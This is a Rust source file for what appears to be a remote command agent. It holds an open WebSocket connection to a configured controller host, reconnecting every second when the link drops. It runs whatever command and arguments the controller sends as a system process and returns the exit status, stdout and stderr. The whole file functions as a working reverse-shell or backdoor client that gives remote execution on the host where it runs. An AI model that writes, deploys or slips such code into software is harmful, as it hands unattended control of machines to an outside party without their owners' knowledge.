use std::{process::Output, sync::Arc, time::Duration};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use tokio::{process::Command, sync::Mutex};
use tokio_tungstenite::{connect_async, tungstenite::Message, WebSocketStream};

use crate::{Config, Payload, Report};

type WebSocketSender =
    SplitSink<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>, Message>;
type WebSocketReceiver =
    SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>;

pub async fn start(config: Config, debug: bool) {
    loop {
        let (ws_sender, ws_receiver) = match connect(&config, debug).await {
            Some((ws_sender, ws_receiver)) => (ws_sender, ws_receiver),
            None => {
                tokio::time::sleep(Duration::from_secs(1)).await;
                continue;
            }
        };

        serve((ws_sender, ws_receiver), debug).await;
    }
}

async fn connect(config: &Config, debug: bool) -> Option<(WebSocketSender, WebSocketReceiver)> {
    let ws_connection = match connect_async(format!("ws://{}:{}", config.ip, config.port)).await {
        Ok(ws_connection) => ws_connection,
        Err(err_val) => {
            if debug {
                eprintln!("Error: WebSocket Connection | {}", err_val);
            }
            return None;
        }
    };

    let (ws_sender, ws_receiver) = ws_connection.0.split();
    Some((ws_sender, ws_receiver))
}

async fn serve((ws_sender, mut ws_receiver): (WebSocketSender, WebSocketReceiver), debug: bool) {
    let ws_sender = Arc::new(Mutex::new(ws_sender));
    while let Some(message) = receive(&mut ws_receiver, debug).await {
        match serde_json::from_str::<Payload>(&message[..]) {
            Ok(payload) => {
                let ws_sender = ws_sender.clone();
                tokio::spawn(async move {
                    let output = execute(payload.clone(), debug).await;
                    send(output, payload, ws_sender.clone(), debug).await
                });
            }
            Err(err_val) => {
                if debug {
                    eprintln!("Error: Message to Payload | {}", err_val);
                }
                continue;
            }
        };
    }
}

async fn execute(payload: Payload, debug: bool) -> Option<Output> {
    if debug {
        println!("{:#?}", payload);
    }
    match Command::new(payload.command)
        .args(payload.args)
        .output()
        .await
    {
        Ok(output) => Some(output),
        Err(err_val) => {
            if debug {
                eprintln!("Error: Command Execution | {}", err_val);
            }
            return None;
        }
    }
}

async fn receive(ws_receiver: &mut WebSocketReceiver, debug: bool) -> Option<String> {
    match ws_receiver.next().await {
        Some(message) => match message {
            Ok(message) => {
                if let Message::Text(message) = message {
                    Some(message)
                } else {
                    if debug {
                        eprintln!("Error: Message Type | {:#?}", message);
                    }
                    None
                }
            }
            Err(err_val) => {
                if debug {
                    eprintln!("Error: Message | {}", err_val);
                }
                None
            }
        },
        None => {
            if debug {
                eprintln!("Error: WebSocket Receive");
            }
            None
        }
    }
}

async fn send(
    output: Option<Output>,
    payload: Payload,
    ws_sender: Arc<Mutex<WebSocketSender>>,
    debug: bool,
) -> bool {
    let report = match output {
        Some(output) => Report {
            payload,
            status: output.status.to_string(),
            stdout: String::from_utf8(output.stdout).unwrap(),
            stderr: String::from_utf8(output.stderr).unwrap(),
        },
        None => Report {
            payload,
            status: "Nope".to_string(),
            stdout: "Nope".to_string(),
            stderr: "Nope".to_string(),
        },
    };

    let report = serde_json::json!(report);
    let result = ws_sender.lock().await.send(report.to_string().into()).await;
    match result {
        Ok(_) => {
            let result = ws_sender.lock().await.flush().await;
            match result {
                Ok(_) => true,
                Err(err_val) => {
                    if debug {
                        eprintln!("Error: WebSocket Flush | {}", err_val);
                    }
                    false
                }
            }
        }
        Err(err_val) => {
            if debug {
                eprintln!("Error: WebSocket Send | {}", err_val);
            }
            false
        }
    }
}
